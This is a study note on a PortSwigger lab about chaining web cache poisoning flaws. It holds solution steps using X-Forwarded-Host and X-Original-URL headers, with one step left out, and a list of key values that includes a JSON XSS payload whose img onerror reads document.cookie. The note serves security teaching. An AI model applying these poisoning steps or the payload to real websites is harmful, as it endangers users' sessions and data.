# Lab: Combining web cache poisoning vulnerabilities

**Official PortSwigger URL:** https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities

**Lab idea:** This challenge explores a cache-poisoning chain that combines multiple response and cache behaviors, including influencing content for a distinct language variant. It practices reasoning about how separate weaknesses can interact and how a cached response may be delivered to users beyond the request that produced it.

## Vulnerability in brief
Web cache poisoning is a vulnerability in which an attacker causes a cache to store a harmful HTTP response and then serves that response to other users. In general, the attack requires both an input that changes the back-end response and a way to have the resulting response cached. A cache identifies requests using a cache key, usually a subset of request components; inputs omitted from that key are unkeyed. If an unkeyed value influences the response, the cache may treat a harmful response as interchangeable with a normal one. [PortSwigger's topic guide](https://portswigger.net/web-security/web-cache-poisoning)

## Solution idea
1. With Burp running, load the website's home page.
2. Use Param Miner to identify that the X-Forwarded-Host and X-Original-URL headers are supported.
3. In Burp Repeater, experiment with the X-Forwarded-Host header and observe that it can be used to import an arbitrary JSON file instead of the translations.json file, which contains…
4. Notice that the website is vulnerable to DOM-XSS due to the way the initTranslations() function handles data from the JSON file for all languages except English.
- …
6. Now, while the cache is still poisoned, also poison the GET / page using X-Original-URL: /setlang\es to force all users to the Spanish page.
7. To simulate the victim, load the English page in the browser and make sure that you are redirected and that the alert() fires.
8. Replay both requests in sequence to keep the cache poisoned on both pages until the victim visits the site and the lab is solved.

## Payloads / key values
- `X-Forwarded-Host`
- `X-Original-URL`
- `translations.json`
- `initTranslations()`
- `/resources/json/translations.json`
- `Access-Control-Allow-Origin: *`
- `{ "en": { "name": "English" }, "es": { "name": "español", "translations": { "Return to list": "Volver a la lista", "View details": "</a><img src=1 onerror='alert(document.cookie)' />", "Description:": "Descripción" } } }`
- `GET`
- `/?localized=1`
- `lang`
- `lang=es`
- `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
- `alert()`
- `/setlang/es`
- `?localized=1`
- `Set-Cookie`
- `X-Original-URL: /setlang\es`
- `GET /?localized=1`
- `GET /`

## Official source
- [PortSwigger Academy: Lab: Combining web cache poisoning vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities)
